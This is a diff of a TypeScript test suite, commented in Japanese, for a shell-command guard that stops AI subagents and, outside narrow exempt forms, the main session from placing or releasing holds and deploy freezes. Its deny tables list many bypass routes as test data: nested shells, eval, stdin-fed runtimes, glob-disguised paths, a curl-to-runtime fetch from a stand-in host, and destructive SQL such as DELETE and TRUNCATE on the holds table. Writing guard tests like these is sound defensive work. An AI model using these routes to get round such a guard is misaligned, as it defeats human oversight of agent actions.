@@ -8,6 +8,43 @@ import { decide, denyReason } from "./decide.ts";
 /** シェルのパラメーター展開の開き。文字列に直接書くとリンターが誤検知するため組み立てる。 */
 const OPEN = "$".concat("{");
 
+/**
+ * 保留と凍結の判定を、subagentと主セッションの両方に当てる。
+ * 主セッションの免除は、`mise run <タスク>`の単独の行1つだけである(`EXEMPT_FORMS`)。
+ * 免除の形は主セッションで許可になるので、拒否の表からは外す。
+ */
+function describeForCallers(
+  title: string,
+  body: (subagent: boolean) => void,
+): void {
+  describe.each([
+    ["a subagent", true],
+    ["the main session", false],
+  ])(`${title} (%s)`, (_caller, subagent) => {
+    body(subagent);
+  });
+}
+
+/** 主セッションで許可になる、免除の形の行。 */
+const EXEMPT_FORMS: ReadonlySet<string> = new Set([
+  "mise run hold:place",
+  "mise run hold:place -- --scope merge --target a/b --minutes 5 --reason x",
+  "mise run hold:release -- 1",
+  "mise run freeze:place -- --scope deploy --minutes 60 --reason x",
+  "mise run freeze:place -- --minutes 60 --reason x --scope deploy",
+  "mise run freeze:place -- --scope=deploy --minutes 60 --reason x",
+  "mise run freeze:place -- --scope DEPLOY --minutes 60 --reason x",
+  "mise run freeze:release -- d0a1b2c3",
+]);
+
+/** 拒否の表の行のうち、呼び出し元で拒否になるものだけを返す。 */
+function deniedFor(
+  subagent: boolean,
+  rows: readonly string[],
+): readonly string[] {
+  return subagent ? rows : rows.filter((row) => !EXEMPT_FORMS.has(row));
+}
+
 describe("bash-guard deny reasons", () => {
   test("a force push points at force-with-lease", async () => {
     expect(await denyReason("git push --force origin feature")).toContain(
@@ -1339,301 +1376,445 @@ describe("bash-guard allows mentioning CHECK_IDLE_FORCE without setting it", () 
 
 // 保留(hold)を置く・解除する操作は、subagentに許さない。許すのは一覧(list)だけである。
 // ベストエフォートの規則で、別名の呼び出しや、変数で組んだパスは止めない。
-describe("bash-guard denies a subagent that places or releases a hold", () => {
+describeForCallers(
+  "bash-guard denies a caller that places or releases a hold",
+  (subagent) => {
+    test.each(
+      deniedFor(subagent, [
+        "bun scripts/hold.ts place --scope merge --target acme/widgets --minutes 5 --reason x",
+        "bun ./scripts/hold.ts release 1",
+        "bun run scripts/hold.ts place",
+        "bun run ./scripts/hold.ts release 3",
+        "bun /Users/someone/ws/atelier-works/scripts/hold.ts place",
+        "bun scripts/hold.ts",
+        "bun scripts/hold.ts --help",
+        "bun scripts/hold.ts -- place",
+        "bun scripts/hold.ts list; bun scripts/hold.ts place",
+        "bun scripts/hold.ts list && bun scripts/hold.ts release 1",
+        "bunx tsx scripts/hold.ts place",
+        "bun x tsx scripts/hold.ts place",
+        "npx tsx scripts/hold.ts place",
+        "node scripts/hold.ts place",
+        "node --experimental-strip-types scripts/hold.ts place",
+        "tsx scripts/hold.ts place",
+        "deno run scripts/hold.ts place",
+        "deno run -A scripts/hold.ts release 2",
+        "env FOO=1 bun scripts/hold.ts place",
+        "timeout 30 bun scripts/hold.ts place",
+        "sh -c 'bun scripts/hold.ts place'",
+        "bash -lc 'bun ./scripts/hold.ts release 1'",
+        "echo 'bun scripts/hold.ts place' | sh",
+        "echo 'mise run hold:release -- 3' | cat | sh",
+        "echo 'mise run hold:release -- 3' | tee /dev/null | sh",
+        "mise exec -- bun scripts/hold.ts place",
+        "mise x -- bun scripts/hold.ts release 1",
+        "mise run hold:place",
+        "mise run hold:place -- --scope merge --target a/b --minutes 5 --reason x",
+        "mise run hold:release -- 1",
+        "mise r hold:place",
+        "mise r hold:release -- 1",
+        "mise hold:place",
+        "mise hold:release 1",
+        "mise tasks run hold:release -- 3",
+        "mise tasks r hold:place",
+        "mise run lint ::: hold:place",
+        "mise -C /repo run hold:place",
+        "mise run 'hold:*'",
+        "mise run hold:*",
+        "mise run 'hold:rel*'",
+        "mise run '*'",
+        'mise run "$TASK"',
+        'mise run hold:"$ACTION"',
+        "bun -e \"import {placeHold} from './f/factory/lib/holds.ts'; import {createHoldPsqlClient} from './scripts/hold_psql.ts'; console.log(placeHold, createHoldPsqlClient)\"",
+        "bun -e \"import './scripts/hold_psql.ts'\"",
+        "bun run - < scripts/hold.ts",
+        "bun run - place < ./scripts/hold.ts",
+        "cat scripts/hold.ts | bun --cwd scripts run - place --scope merge --target a/b --minutes 5 --reason x",
+        'bun run - place <<< "$(cat scripts/hold.ts)"',
+        "bun run - place < <(cat scripts/hold.ts)",
+        "cat scripts/hold.ts | node -",
+        "cat < scripts/hold.ts | bun --cwd scripts run - place --scope merge --target a/b --minutes 5 --reason x",
+        'cat <<< "$(cat scripts/hold.ts)" | bun run - place',
+        "bun --eval \"await import('./f/factory/lib/holds.ts')\"",
+        "node -e \"require('./scripts/hold_psql.ts')\"",
+        "deno eval \"import './scripts/hold.ts'\"",
+        "bun -p \"import('./scripts/hold.ts')\"",
+        "bun run - <<'EOF'\nimport './f/factory/lib/holds.ts';\nEOF",
+        'docker compose -f infra/docker-compose.yml exec -T db psql -U postgres -d datatable_db -c "UPDATE factory.holds SET released_at = now()"',
+        "docker compose exec db psql -c 'DELETE FROM factory.holds'",
+        "docker-compose exec db psql -c 'TRUNCATE factory.holds'",
+        "docker-compose -f infra/docker-compose.yml exec -T db psql -c 'UPDATE factory.holds SET x = 1'",
+        'psql -c "UPDATE factory.holds SET released_at = now()"',
+        "psql -d datatable_db -f /tmp/holds.sql",
+        "docker compose exec -T db psql -U postgres -f /tmp/holds.sql",
+        'echo "UPDATE factory.holds SET released_at = now()" | docker compose exec -T db psql -U postgres -d datatable_db',
+        "printf 'DELETE FROM factory.holds' | psql",
+        "docker compose exec -T db psql -U postgres <<'SQL'\nUPDATE factory.holds SET released_at = now();\nSQL",
+        "psql <<<'DELETE FROM factory.holds'",
+        "mise exec -- psql -c 'UPDATE factory.holds SET x = 1'",
+        "sh -c \"psql -c 'UPDATE factory.holds SET x = 1'\"",
+      ]),
+    )("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
+
+    test.skipIf(!subagent)(
+      "the reason tells the subagent to ask the main session or a person",
+      async () => {
+        expect(
+          await denyReason("bun scripts/hold.ts place", { subagent }),
+        ).toContain("main session");
+      },
+    );
+
+    test.skipIf(!subagent)(
+      "the reason is the same for the mise task",
+      async () => {
+        expect(
+          await denyReason("mise run hold:release -- 1", { subagent }),
+        ).toContain("must not place or release holds");
+      },
+    );
+  },
+);
+
+describeForCallers(
+  "bash-guard allows a caller to list holds and to work on the hold code",
+  (subagent) => {
+    test.each([
+      "bun scripts/hold.ts list",
+      "bun ./scripts/hold.ts list",
+      "bun run scripts/hold.ts list",
+      "bun /Users/someone/ws/atelier-works/scripts/hold.ts list",
+      "node scripts/hold.ts list",
+      "mise exec -- bun scripts/hold.ts list",
+      "mise run hold:list",
+      "mise r hold:list",
+      "mise hold:list",
+      "mise tasks run hold:list",
+      "mise run freeze:list",
+      "mise run check",
+      "mise run test:db",
+      "mise run lint ::: typecheck",
+      "bun test tests/scripts/hold.test.ts",
+      "bun test tests/scripts/hold_psql.test.ts tests/scripts/hold_wiring.test.ts",
+      "bun test tests/lib/holds.test.ts",
+      "bunx biome check scripts/hold.ts",
+      "bunx biome check scripts/hold.ts scripts/hold_psql.ts f/factory/lib/holds.ts",
+      "bunx tsc --noEmit scripts/hold.ts",
+      "bun run scripts/lint-no-type-assertions.ts scripts/hold.ts",
+      "bun x biome check scripts/hold.ts",
+      "git add scripts/hold.ts scripts/hold_psql.ts",
+      "git diff -- f/factory/lib/holds.ts",
+      "git commit -m 'feat: scripts/hold.ts place と release'",
+      "cat scripts/hold.ts",
+      "grep -n holds docs/internals/holds.md",
+      "rg 'factory.holds' f",
+      "docker compose ps",
+      "docker compose -f infra/docker-compose.yml exec -T db psql -U postgres -d datatable_db -c 'SELECT 1'",
+      "docker compose exec db psql -c 'SELECT count(*) FROM factory.work_items'",
+      "psql --version",
+      "echo 'SELECT 1' | docker compose exec -T db psql -U postgres",
+      "echo 'hold.ts place is for the main session'",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("allow");
+    });
+  },
+);
+
+// 主セッションが保留と凍結を書くのは、`mise run <タスク>`の単独の行だけである。
+// 引数はリテラルで、英数字、日本語の文字、`-_.:/=,+@`と、語の中のスペースに限る。
+describe("bash-guard allows the main session to run the closed hold and freeze forms", () => {
   test.each([
-    "bun scripts/hold.ts place --scope merge --target acme/widgets --minutes 5 --reason x",
-    "bun ./scripts/hold.ts release 1",
-    "bun run scripts/hold.ts place",
-    "bun run ./scripts/hold.ts release 3",
-    "bun /Users/someone/ws/atelier-works/scripts/hold.ts place",
-    "bun scripts/hold.ts",
-    "bun scripts/hold.ts --help",
-    "bun scripts/hold.ts -- place",
-    "bun scripts/hold.ts list; bun scripts/hold.ts place",
-    "bun scripts/hold.ts list && bun scripts/hold.ts release 1",
-    "bunx tsx scripts/hold.ts place",
-    "bun x tsx scripts/hold.ts place",
-    "npx tsx scripts/hold.ts place",
-    "node scripts/hold.ts place",
-    "node --experimental-strip-types scripts/hold.ts place",
-    "tsx scripts/hold.ts place",
-    "deno run scripts/hold.ts place",
-    "deno run -A scripts/hold.ts release 2",
-    "env FOO=1 bun scripts/hold.ts place",
-    "timeout 30 bun scripts/hold.ts place",
-    "sh -c 'bun scripts/hold.ts place'",
-    "bash -lc 'bun ./scripts/hold.ts release 1'",
-    "echo 'bun scripts/hold.ts place' | sh",
-    "echo 'mise run hold:release -- 3' | cat | sh",
-    "echo 'mise run hold:release -- 3' | tee /dev/null | sh",
-    "mise exec -- bun scripts/hold.ts place",
-    "mise x -- bun scripts/hold.ts release 1",
     "mise run hold:place",
-    "mise run hold:place -- --scope merge --target a/b --minutes 5 --reason x",
+    "mise run hold:place -- --scope merge --target acme/widgets --minutes 5 --reason x",
+    "mise run hold:place -- --scope merge --target acme/widgets --minutes 5 --reason 'verify before merge'",
+    'mise run hold:place -- --scope merge --target acme/widgets --minutes 5 --reason "実機で確かめる間"',
     "mise run hold:release -- 1",
-    "mise r hold:place",
-    "mise r hold:release -- 1",
-    "mise hold:place",
-    "mise hold:release 1",
-    "mise tasks run hold:release -- 3",
-    "mise tasks r hold:place",
-    "mise run lint ::: hold:place",
-    "mise -C /repo run hold:place",
-    "mise run 'hold:*'",
-    "mise run hold:*",
-    "mise run 'hold:rel*'",
-    "mise run '*'",
-    'mise run "$TASK"',
-    'mise run hold:"$ACTION"',
-    "bun -e \"import {placeHold} from './f/factory/lib/holds.ts'; import {createHoldPsqlClient} from './scripts/hold_psql.ts'; console.log(placeHold, createHoldPsqlClient)\"",
-    "bun -e \"import './scripts/hold_psql.ts'\"",
-    "bun run - < scripts/hold.ts",
-    "bun run - place < ./scripts/hold.ts",
-    "cat scripts/hold.ts | bun --cwd scripts run - place --scope merge --target a/b --minutes 5 --reason x",
-    'bun run - place <<< "$(cat scripts/hold.ts)"',
-    "bun run - place < <(cat scripts/hold.ts)",
-    "cat scripts/hold.ts | node -",
-    "cat < scripts/hold.ts | bun --cwd scripts run - place --scope merge --target a/b --minutes 5 --reason x",
-    'cat <<< "$(cat scripts/hold.ts)" | bun run - place',
-    "bun --eval \"await import('./f/factory/lib/holds.ts')\"",
-    "node -e \"require('./scripts/hold_psql.ts')\"",
-    "deno eval \"import './scripts/hold.ts'\"",
-    "bun -p \"import('./scripts/hold.ts')\"",
-    "bun run - <<'EOF'\nimport './f/factory/lib/holds.ts';\nEOF",
-    'docker compose -f infra/docker-compose.yml exec -T db psql -U postgres -d datatable_db -c "UPDATE factory.holds SET released_at = now()"',
-    "docker compose exec db psql -c 'DELETE FROM factory.holds'",
-    "docker-compose exec db psql -c 'TRUNCATE factory.holds'",
-    "docker-compose -f infra/docker-compose.yml exec -T db psql -c 'UPDATE factory.holds SET x = 1'",
-    'psql -c "UPDATE factory.holds SET released_at = now()"',
-    "psql -d datatable_db -f /tmp/holds.sql",
-    "docker compose exec -T db psql -U postgres -f /tmp/holds.sql",
-    'echo "UPDATE factory.holds SET released_at = now()" | docker compose exec -T db psql -U postgres -d datatable_db',
-    "printf 'DELETE FROM factory.holds' | psql",
-    "docker compose exec -T db psql -U postgres <<'SQL'\nUPDATE factory.holds SET released_at = now();\nSQL",
-    "psql <<<'DELETE FROM factory.holds'",
-    "mise exec -- psql -c 'UPDATE factory.holds SET x = 1'",
-    "sh -c \"psql -c 'UPDATE factory.holds SET x = 1'\"",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
-
-  test("the reason tells the subagent to ask the main session or a person", async () => {
-    expect(
-      await denyReason("bun scripts/hold.ts place", { subagent: true }),
-    ).toContain("main session");
-  });
-
-  test("the reason is the same for the mise task", async () => {
-    expect(
-      await denyReason("mise run hold:release -- 1", { subagent: true }),
-    ).toContain("must not place or release holds");
-  });
-});
-
-describe("bash-guard allows a subagent to list holds and to work on the hold code", () => {
-  test.each([
-    "bun scripts/hold.ts list",
-    "bun ./scripts/hold.ts list",
-    "bun run scripts/hold.ts list",
-    "bun /Users/someone/ws/atelier-works/scripts/hold.ts list",
-    "node scripts/hold.ts list",
-    "mise exec -- bun scripts/hold.ts list",
+    "mise run hold:release -- d0a1b2c3",
+    "mise run freeze:place -- --scope deploy --minutes 60 --reason x",
+    "mise run freeze:place -- --target f/factory/collect_github --minutes 30 --reason verify",
+    "mise run freeze:release -- d0a1b2c3",
     "mise run hold:list",
-    "mise r hold:list",
-    "mise hold:list",
-    "mise tasks run hold:list",
     "mise run freeze:list",
-    "mise run check",
-    "mise run test:db",
-    "mise run lint ::: typecheck",
-    "bun test tests/scripts/hold.test.ts",
-    "bun test tests/scripts/hold_psql.test.ts tests/scripts/hold_wiring.test.ts",
-    "bun test tests/lib/holds.test.ts",
-    "bunx biome check scripts/hold.ts",
-    "bunx biome check scripts/hold.ts scripts/hold_psql.ts f/factory/lib/holds.ts",
-    "bunx tsc --noEmit scripts/hold.ts",
-    "bun run scripts/lint-no-type-assertions.ts scripts/hold.ts",
-    "bun x biome check scripts/hold.ts",
-    "git add scripts/hold.ts scripts/hold_psql.ts",
-    "git diff -- f/factory/lib/holds.ts",
-    "git commit -m 'feat: scripts/hold.ts place と release'",
-    "cat scripts/hold.ts",
-    "grep -n holds docs/internals/holds.md",
-    "rg 'factory.holds' f",
-    "docker compose ps",
-    "docker compose -f infra/docker-compose.yml exec -T db psql -U postgres -d datatable_db -c 'SELECT 1'",
-    "docker compose exec db psql -c 'SELECT count(*) FROM factory.work_items'",
-    "psql --version",
-    "echo 'SELECT 1' | docker compose exec -T db psql -U postgres",
-    "echo 'hold.ts place is for the main session'",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("allow");
-  });
-});
-
-describe("bash-guard leaves the main session free to place and release holds", () => {
-  test.each([
-    "bun scripts/hold.ts place --scope merge --target acme/widgets --minutes 5 --reason x",
-    "bun ./scripts/hold.ts release 1",
-    "mise run hold:place",
-    "mise run hold:release -- 1",
-    "mise r hold:place",
-    "mise exec -- bun scripts/hold.ts place",
-    "sh -c 'bun scripts/hold.ts place'",
-    "bun -e \"import './scripts/hold_psql.ts'\"",
-    "docker compose exec db psql -c 'UPDATE factory.holds SET x = 1'",
-    "psql -f /tmp/holds.sql",
   ])("%s", async (command) => {
     expect(await decide(command)).toBe("allow");
+  });
+
+  test.each([
+    "cat scripts/hold.ts",
+    "rg -n release scripts/hold.ts",
+    "git log -- scripts/hold.ts",
+    "mise run check",
+    "git commit -m 'feat: hold.ts と freeze.ts の説明'",
+  ])("%s is not a hold operation", async (command) => {
+    expect(await decide(command)).toBe("allow");
+  });
+});
+
+// 免除の形に何か1つ足すと、subagentと同じ判定に戻って拒否する。分類ごとに並べる。
+describe("bash-guard denies the main session when a closed form gets anything else", () => {
+  test.each([
+    // 先頭の代入
+    "FOO=1 mise run hold:place",
+    "PAGER=cat mise run hold:release -- 1",
+    // 前置き
+    "env mise run hold:place",
+    "sudo mise run hold:release -- 1",
+    "nice mise run freeze:release -- 1",
+    "timeout 30 mise run hold:place",
+    "nohup mise run hold:place",
+    "time mise run hold:place",
+    "script -q /dev/null mise run hold:place",
+    "caffeinate mise run freeze:release -- 1",
+    // miseのオプション
+    "mise -C /repo run hold:place",
+    "mise -q run hold:place",
+    "mise run -q hold:place",
+    "mise run --jobs 1 hold:place",
+    // 別名とパス
+    "mise r hold:place",
+    "mise hold:place",
+    "mise tasks run hold:release -- 1",
+    "/usr/local/bin/mise run hold:place",
+    "./mise run hold:place",
+    // mise exec
+    "mise exec -- mise run hold:place",
+    "mise exec -- bun scripts/hold.ts place",
+    // 引数の形
+    "mise run hold:release 1",
+    "mise run hold:place --scope merge",
+    // パイプ、2つ目のコマンド、リダイレクト、後ろに回す実行
+    "echo x | mise run hold:place",
+    "mise run hold:place | cat",
+    "mise run hold:place && mise run hold:release -- 1",
+    "mise run hold:list; mise run hold:place",
+    "true || mise run hold:place",
+    "mise run hold:place > /tmp/out",
+    "mise run hold:place < /tmp/in",
+    "mise run hold:place &",
+    "mise run hold:place\nmise run hold:release -- 1",
+    // 実行時に決まる語とメタ文字を持つ引数
+    "mise run hold:place -- --reason $REASON",
+    'mise run hold:place -- --reason "$(date)"',
+    "mise run hold:place -- --reason `date`",
+    "mise run hold:place -- --reason *",
+    "mise run hold:place -- --target a/{b,c}",
+    "mise run hold:place -- --reason ~",
+    "mise run hold:place -- --reason 'a;b'",
+    "mise run hold:place -- --reason 'a|b'",
+    "mise run hold:place -- --reason 'a&b'",
+    "mise run hold:place -- --reason 'a>b'",
+    "mise run hold:place -- --reason 'a(b)'",
+    'mise run hold:place -- --reason "it\'s"',
+    "mise run hold:place -- --reason 'a\\b'",
+    "mise run hold:place -- --reason '#x'",
+    "mise run hold:place -- --reason ':::'",
+    // 免除の外のタスク
+    "mise run freeze:reset",
+    "mise run push:prune",
+    "mise run push -- --prune",
+    "mise run hold:place2",
+    "mise run hold:*",
+    'mise run "$TASK"',
+    // 保留と凍結のコードの直接実行
+    "bun scripts/hold.ts place --scope merge --target acme/widgets --minutes 5 --reason x",
+    "bun ./scripts/hold.ts release 1",
+    "bun run scripts/hold.ts release 1",
+    "./scripts/hold.ts release 1",
+    "bun scripts/freeze.ts place --scope deploy --minutes 60 --reason x",
+    "bun scripts/freeze.ts release d0a1b2c3",
+    "bun scripts/freeze.ts reset",
+    "bun scripts/freeze.ts push --prune",
+    // 入れ子の文字列と標準入力の中
+    "sh -c 'mise run hold:place'",
+    "bash -lc 'mise run hold:release -- 1'",
+    "eval 'mise run hold:place'",
+    "bun exec 'mise run hold:place'",
+    "echo 'mise run hold:release -- 1' | sh",
+    "sh <<< 'mise run hold:place'",
+    "sh <<'EOF'\nmise run hold:place\nEOF",
+    // SQLとライブラリ
+    "docker compose exec db psql -c 'UPDATE factory.holds SET x = 1'",
+    "psql -f /tmp/holds.sql",
+    "bun -e \"import './scripts/hold_psql.ts'\"",
+  ])("%s", async (command) => {
+    expect(await decide(command)).toBe("deny");
+  });
+});
+
+describe("bash-guard explains a denial to the main session", () => {
+  test.each([
+    ["an operation", "bun scripts/hold.ts place"],
+    ["an unreadable prefix", "base64 -d <<< eA== | script -q /dev/null"],
+    ["a word-adding context", "echo a | xargs vim"],
+    ["an assignment", "TARGET=scripts/hold.ts true"],
+    ["a dynamic word", 'mise run "$TASK"'],
+    ["an unknown option", "mise --future-flag run check"],
+  ])("%s does not address a subagent", async (_kind, command) => {
+    expect(await denyReason(command)).not.toContain("Subagents must not");
+  });
+
+  test.each([
+    ["an operation", "bun scripts/hold.ts place"],
+    ["an unreadable prefix", "base64 -d <<< eA== | script -q /dev/null"],
+    ["a word-adding context", "echo a | xargs vim"],
+    ["an assignment", "TARGET=scripts/hold.ts true"],
+    ["a dynamic word", 'mise run "$TASK"'],
+    ["an unknown option", "mise --future-flag run check"],
+  ])("%s points at the closed form", async (_kind, command) => {
+    const reason = await denyReason(command);
+    expect(reason).toContain("single line");
+    expect(reason).toContain("mise run hold:place");
+    expect(reason).toContain("mise run freeze:release");
   });
 });
 
 // deployの保留(`freeze:place --scope deploy`)を置くことと、凍結の解除(`freeze:release`)は、subagentに許さない。
 // スケジュールの凍結を置くこと(`--scope`なし、または`--scope schedule`)と、一覧と検査は許す。
-describe("bash-guard denies a subagent that places a deploy freeze or releases a freeze", () => {
-  test.each([
-    "mise run freeze:place -- --scope deploy --minutes 60 --reason x",
-    "mise run freeze:place -- --minutes 60 --reason x --scope deploy",
-    "mise run freeze:place -- --scope=deploy --minutes 60 --reason x",
-    "mise run freeze:place -- --scope DEPLOY --minutes 60 --reason x",
-    "mise r freeze:place -- --scope deploy --minutes 60 --reason x",
-    "mise freeze:place --scope deploy --minutes 60 --reason x",
-    "mise tasks run freeze:place -- --scope deploy --minutes 60 --reason x",
-    "mise -C /repo run freeze:place -- --scope deploy --minutes 60 --reason x",
-    "mise run freeze:place -- --scope $SCOPE --minutes 60 --reason x",
-    'mise run freeze:place -- --scope "$(echo deploy)" --minutes 60 --reason x',
-    "mise run freeze:place -- --scope dep* --minutes 60 --reason x",
-    "mise run freeze:release -- d0a1b2c3",
-    "mise r freeze:release -- 1",
-    "mise freeze:release 1",
-    "mise tasks run freeze:release -- 1",
-    "mise run 'freeze:*'",
-    "mise run freeze:rel*",
-    "mise run freeze:place ::: freeze:release",
-    "bun scripts/freeze.ts place --scope deploy --minutes 60 --reason x",
-    "bun ./scripts/freeze.ts release d0a1b2c3",
-    "bun run scripts/freeze.ts release 1",
-    "bun scripts/freeze release 1",
-    "bun /Users/someone/ws/atelier-works/scripts/freeze.ts place --scope deploy --minutes 60 --reason x",
-    "node scripts/freeze.ts release 1",
-    "bunx tsx scripts/freeze.ts release 1",
-    "./scripts/freeze.ts release 1",
-    "mise exec -- bun scripts/freeze.ts release 1",
-    "sh -c 'bun scripts/freeze.ts release 1'",
-    "bun scripts/freeze.ts list; bun scripts/freeze.ts release 1",
-    "bun scripts/freeze.ts $ACTION",
-    "bun scripts/freeze.ts place --scope $SCOPE --minutes 60 --reason x",
-    "bun scripts/freeze.ts -- release 1",
-    "bun scripts/freeze.ts -- -- release 1",
-    "bun scripts/freeze.ts -- place --scope deploy --minutes 60 --reason x",
-    "bun run scripts/freeze.ts -- release 1",
-    "bun run scripts/fre?ze.ts release 1",
-    "bun run scripts/fr*e.ts release 1",
-    "bun fr*e.ts place --scope deploy --minutes 60 --reason x",
-    "bun scripts/fre[a-z]ze.ts release 1",
-    "bun scripts/fre[[:alpha:]]ze.ts release 1",
-    "bun run scripts/* release 1",
-    "./scripts/fre?ze.ts release 1",
-    "bun --preload ./scripts/freeze.ts scripts/freeze.ts release 1",
-    "bun scripts/freeze.ts list scripts/freeze.ts release 1",
-    "bun -e \"await Bun.spawn(['bun','scripts/freeze.ts','release','1'])\"",
-    "bun run - <<'EOF'\nimport './scripts/freeze.ts'; process.argv.push('release');\nEOF",
-    "echo 'release 1' | bun scripts/freeze.ts $(cat)",
-    "bun run - list < scripts/freeze.ts",
-    "bun run - list < ./scripts/freeze.ts",
-    "bun run - < scripts/fre?ze.ts",
-    "node - < scripts/freeze.ts",
-    "cat scripts/freeze.ts | bun --cwd scripts run - place --scope deploy --minutes 120 --reason x",
-    "cat scripts/freeze.ts | bun run - place --scope deploy --minutes 5 --reason x",
-    "cat scripts/freeze.ts | bun run - release 1",
-    'bun run - release 1 <<< "$(cat scripts/freeze.ts)"',
-    'bun run - release 1 <<< "$(cat $FILE)"',
-    "bun run - release 1 < <(cat scripts/freeze.ts)",
-    "curl -s http://example.test/x.ts | bun run - release 1",
-    "echo \"import './scripts/freeze.ts'\" | bun run - release 1",
-    "echo $CODE | bun run - release 1",
-    "cat $FILE | bun run - release 1",
-    "cat < scripts/freeze.ts | bun --cwd scripts run - release 1",
-    'cat <<< "$(cat scripts/freeze.ts)" | bun --cwd scripts run - release 1',
-    "cat <<EOF | bun run - release 1\nimport $X\nEOF",
-    'cat < "$FILE" | bun run - release 1',
-    "cat < scripts/freeze.ts | bun run /dev/stdin release 1",
-    "cat < scripts/freeze.ts | bun run /dev/fd/0 release 1",
-    "cat < scripts/freeze.ts | bun run /proc/self/fd/0 release 1",
-    "bun run /dev/fd/0 release 1 < scripts/freeze.ts",
-    "bun run x.ts < <(echo hi)",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
-
-  test("the reason names the deploy freeze", async () => {
-    expect(
-      await denyReason(
+describeForCallers(
+  "bash-guard denies a caller that places a deploy freeze or releases a freeze",
+  (subagent) => {
+    test.each(
+      deniedFor(subagent, [
         "mise run freeze:place -- --scope deploy --minutes 60 --reason x",
-        { subagent: true },
-      ),
-    ).toContain("deploy freeze");
-  });
+        "mise run freeze:place -- --minutes 60 --reason x --scope deploy",
+        "mise run freeze:place -- --scope=deploy --minutes 60 --reason x",
+        "mise run freeze:place -- --scope DEPLOY --minutes 60 --reason x",
+        "mise r freeze:place -- --scope deploy --minutes 60 --reason x",
+        "mise freeze:place --scope deploy --minutes 60 --reason x",
+        "mise tasks run freeze:place -- --scope deploy --minutes 60 --reason x",
+        "mise -C /repo run freeze:place -- --scope deploy --minutes 60 --reason x",
+        "mise run freeze:place -- --scope $SCOPE --minutes 60 --reason x",
+        'mise run freeze:place -- --scope "$(echo deploy)" --minutes 60 --reason x',
+        "mise run freeze:place -- --scope dep* --minutes 60 --reason x",
+        "mise run freeze:release -- d0a1b2c3",
+        "mise r freeze:release -- 1",
+        "mise freeze:release 1",
+        "mise tasks run freeze:release -- 1",
+        "mise run 'freeze:*'",
+        "mise run freeze:rel*",
+        "mise run freeze:place ::: freeze:release",
+        "bun scripts/freeze.ts place --scope deploy --minutes 60 --reason x",
+        "bun ./scripts/freeze.ts release d0a1b2c3",
+        "bun run scripts/freeze.ts release 1",
+        "bun scripts/freeze release 1",
+        "bun /Users/someone/ws/atelier-works/scripts/freeze.ts place --scope deploy --minutes 60 --reason x",
+        "node scripts/freeze.ts release 1",
+        "bunx tsx scripts/freeze.ts release 1",
+        "./scripts/freeze.ts release 1",
+        "mise exec -- bun scripts/freeze.ts release 1",
+        "sh -c 'bun scripts/freeze.ts release 1'",
+        "bun scripts/freeze.ts list; bun scripts/freeze.ts release 1",
+        "bun scripts/freeze.ts $ACTION",
+        "bun scripts/freeze.ts place --scope $SCOPE --minutes 60 --reason x",
+        "bun scripts/freeze.ts -- release 1",
+        "bun scripts/freeze.ts -- -- release 1",
+        "bun scripts/freeze.ts -- place --scope deploy --minutes 60 --reason x",
+        "bun run scripts/freeze.ts -- release 1",
+        "bun run scripts/fre?ze.ts release 1",
+        "bun run scripts/fr*e.ts release 1",
+        "bun fr*e.ts place --scope deploy --minutes 60 --reason x",
+        "bun scripts/fre[a-z]ze.ts release 1",
+        "bun scripts/fre[[:alpha:]]ze.ts release 1",
+        "bun run scripts/* release 1",
+        "./scripts/fre?ze.ts release 1",
+        "bun --preload ./scripts/freeze.ts scripts/freeze.ts release 1",
+        "bun scripts/freeze.ts list scripts/freeze.ts release 1",
+        "bun -e \"await Bun.spawn(['bun','scripts/freeze.ts','release','1'])\"",
+        "bun run - <<'EOF'\nimport './scripts/freeze.ts'; process.argv.push('release');\nEOF",
+        "echo 'release 1' | bun scripts/freeze.ts $(cat)",
+        "bun run - list < scripts/freeze.ts",
+        "bun run - list < ./scripts/freeze.ts",
+        "bun run - < scripts/fre?ze.ts",
+        "node - < scripts/freeze.ts",
+        "cat scripts/freeze.ts | bun --cwd scripts run - place --scope deploy --minutes 120 --reason x",
+        "cat scripts/freeze.ts | bun run - place --scope deploy --minutes 5 --reason x",
+        "cat scripts/freeze.ts | bun run - release 1",
+        'bun run - release 1 <<< "$(cat scripts/freeze.ts)"',
+        'bun run - release 1 <<< "$(cat $FILE)"',
+        "bun run - release 1 < <(cat scripts/freeze.ts)",
+        "curl -s http://example.test/x.ts | bun run - release 1",
+        "echo \"import './scripts/freeze.ts'\" | bun run - release 1",
+        "echo $CODE | bun run - release 1",
+        "cat $FILE | bun run - release 1",
+        "cat < scripts/freeze.ts | bun --cwd scripts run - release 1",
+        'cat <<< "$(cat scripts/freeze.ts)" | bun --cwd scripts run - release 1',
+        "cat <<EOF | bun run - release 1\nimport $X\nEOF",
+        'cat < "$FILE" | bun run - release 1',
+        "cat < scripts/freeze.ts | bun run /dev/stdin release 1",
+        "cat < scripts/freeze.ts | bun run /dev/fd/0 release 1",
+        "cat < scripts/freeze.ts | bun run /proc/self/fd/0 release 1",
+        "bun run /dev/fd/0 release 1 < scripts/freeze.ts",
+        "bun run x.ts < <(echo hi)",
+      ]),
+    )("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
 
-  test("the reason is the hold reason for releasing a freeze", async () => {
-    expect(
-      await denyReason("mise run freeze:release -- 1", { subagent: true }),
-    ).toContain("main session");
-  });
-});
+    test.skipIf(!subagent)("the reason names the deploy freeze", async () => {
+      expect(
+        await denyReason(
+          "mise run freeze:place -- --scope deploy --minutes 60 --reason x",
+          { subagent },
+        ),
+      ).toContain("deploy freeze");
+    });
 
-describe("bash-guard allows a subagent to place a schedule freeze and to list freezes", () => {
-  test.each([
-    "mise run freeze:list",
-    "mise run freeze:place -- --target f/factory/collect_github --minutes 30 --reason verify",
-    "mise run freeze:place -- --scope schedule --target f/factory/collect_github --minutes 30 --reason verify",
-    "mise run freeze:place -- --target f/factory/collect_github --minutes 30 --reason 'check the deploy'",
-    "mise run freeze:place -- --target f/factory/collect_github --minutes 30 --reason deploy",
-    "mise run push:dry",
-    "mise run check",
-    "bun scripts/freeze.ts list",
-    "bun scripts/freeze.ts check",
-    "bun scripts/freeze.ts -- list",
-    'bun test tests/scripts/freeze.test.ts -t "deploy freeze"',
-    "bun test --test-name-pattern 'deploy freeze'",
